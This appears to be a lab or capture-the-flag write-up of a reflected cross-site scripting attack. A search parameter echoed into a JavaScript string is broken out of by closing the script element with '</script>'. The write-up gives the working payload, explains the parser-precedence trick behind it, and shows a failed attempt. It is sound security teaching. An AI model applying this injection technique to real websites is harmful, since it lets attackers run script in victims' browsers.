# Attack Chain — script-element closure over an escaped JS string

## Data flow
```
Attacker crafts URL   /?search=</script><script>alert(1)</script>
   │  (transport-encoded; <> arrive raw — the ONLY surviving metachars)
   ▼
[INPUT] GET /?search=…  →  server echoes into var searchTerms = '…';
   │  escaper: '→\'  \→\\  <> raw  " raw
   ▼
[PROCESSING] response bytes:  var searchTerms = '</script><script>alert(1)</script>';
   │  the JS layer would see only string content (every quote escaped) — but the
   │  JS engine never gets to parse: the HTML PARSER runs first:
   ▼
[SINK] HTML tokenizer scanning the <script> raw-text element meets </script>
   │  → ENDS the script element (raw-text scanning ignores JS string semantics)
   │  → <script>alert(1)</script> parses as a FRESH script block
   ▼
[TRUST BOUNDARY CROSSED] fresh block executes in page origin on load
   ▼
RESULT: alert(1); trailing '; becomes inert body text
```

## Why this shape (layer analysis)
- JS-layer breakout impossible: every `'` arrives as `\'` (string content), every
  `\` doubled (no escape-shift). The terminator set is EMPTY at the JS layer.
- HTML-parser layer wide open: `<>` raw means `</script>` terminates the ELEMENT.
  Parser precedence (tokenizer before script engine) is the actual exploit primitive.
- Inner-quote discipline: the fresh block inherits the SAME escaper — single quotes
  inside it arrive `\'` and throw. Payloads must avoid `'` (use `"` — raw — or
  quoteless JS like `alert(1)`). The failed first attempt
  (`<script>document.title='SCRCLOSE'</script>` → silent no-fire with intact-looking
  DOM) is the teaching exhibit: closure without quotelessness fails silently.

## Expected response sequence (verified)
1. `GET /?search=</script><script>alert(1)</script>` → 200, bytes verbatim in script.
2. Browser tokenizes: original script ends early; fresh block runs on parse.
3. `alert(1)` → `is-solved` (first poll).